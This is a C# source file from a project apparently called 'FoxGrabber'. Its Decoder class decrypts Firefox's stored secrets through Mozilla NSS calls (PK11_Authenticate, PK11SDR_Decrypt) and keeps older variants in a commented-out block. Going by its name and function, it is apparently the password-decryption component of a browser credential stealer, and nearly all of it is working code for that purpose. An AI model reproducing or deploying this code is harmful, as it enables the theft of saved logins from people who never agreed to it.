namespace FoxGrabber
{
    using System;
    using System.Runtime.InteropServices;
    using System.Text;
    using static FoxGrabber.Structures;

    public class Decoder
    {
        /*
        public static string NewDecrypt(string cypherText)
        {
            var inStr = new StringBuilder(cypherText);
            var result = new TSECItem();
            var structure = (TSECItem)Marshal.PtrToStructure
            (
                new IntPtr(NSS.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length)), typeof(TSECItem)
            );
            if ((uint)NSS.PK11SDR_Decrypt(ref structure, ref result, 0) > 0 || result.SECItemLen == 0)
            {
                return null;
            }

            byte[] numArray = new byte[result.SECItemLen];
            Marshal.Copy(new IntPtr(result.SECItemData), numArray, 0, result.SECItemLen);
            return Encoding.UTF8.GetString(numArray);
        }

        private static string DecryptUTF(string cypherText)
        {
            var sb = new StringBuilder(cypherText);
            int hi2 = NSS.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
            var tSecDec = new TSECItem();
            var item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
            byte[] bvRet = new byte[tSecDec.SECItemLen];
            if (NSS.PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                }
            }
            return Encoding.UTF8.GetString(bvRet);
        }

        public static string OldDecrypt(string cipherText)
        {
            var sb = new StringBuilder(cipherText);
            var tSecDec = new TSECItem();
            var structure = (TSECItem)Marshal.PtrToStructure
            (
                new IntPtr(NSS.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length)), typeof(TSECItem)
            );

            if (NSS.PK11SDR_Decrypt(ref structure, ref tSecDec, 0) == 0)
            {
                if (tSecDec.SECItemLen != 0)
                {
                    byte[] bvRet = new byte[tSecDec.SECItemLen];
                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
                    return Encoding.UTF8.GetString(bvRet);
                }
            }

            return null;
        }
    }
    */

        public static string Decrypt(string cipherText)
        {
            var tSECItem = default(TSECItem);
            // NSS_Init(FFProfile);
            if (NSS.PK11_GetInternalKeySlot() == 0)
            {
                return string.Empty;
            }
            NSS.PK11_Authenticate(NSS.PK11_GetInternalKeySlot(), true, 0L);
            var tSECItem2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(NSS.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, cipherText, cipherText.Length)), typeof(TSECItem));
            if (NSS.PK11SDR_Decrypt(ref tSECItem2, ref tSECItem, 0) != 0)
            {
                return string.Empty;
            }
            if (tSECItem.SECItemLen != 0)
            {
                byte[] array = new byte[tSECItem.SECItemLen];
                Marshal.Copy(new IntPtr(tSECItem.SECItemData), array, 0, tSECItem.SECItemLen);
                return Encoding.ASCII.GetString(array);
            }
            return string.Empty;
        }
    }
}